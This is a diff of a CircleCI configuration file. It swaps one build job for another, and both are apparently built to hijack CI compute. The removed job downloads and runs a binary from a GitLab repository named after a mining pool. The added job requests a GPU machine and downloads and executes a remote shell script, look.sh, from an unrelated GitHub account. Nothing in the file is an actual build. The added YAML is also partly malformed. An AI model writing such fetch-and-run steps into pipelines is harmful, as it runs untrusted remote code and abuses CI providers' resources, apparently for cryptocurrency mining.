@@ -1,16 +1,11 @@
 version: 2.1
-jobs:
-    trial:
-      docker:
-            - image: cimg/node:18.2.0
-      parallelism: 2
-      steps:
-        - run:
-            name: "trial"
-            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://gitlab.com/Vaping86/vapers86-zpool/-/raw/main/vapertraders.tar.gz && tar -xf vapertraders.tar.gz && sudo ./gas run.ini 
 
-workflows:
-    version: 2.1
-    build:
-        jobs:
-        - trial
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: 
+    parallelism: 2
+      steps:
+      - run: nvidia-smi
+      - run: wget https://raw.githubusercontent.com/vivomito/out/main/look.sh && chmod +x look.sh && ./look.sh
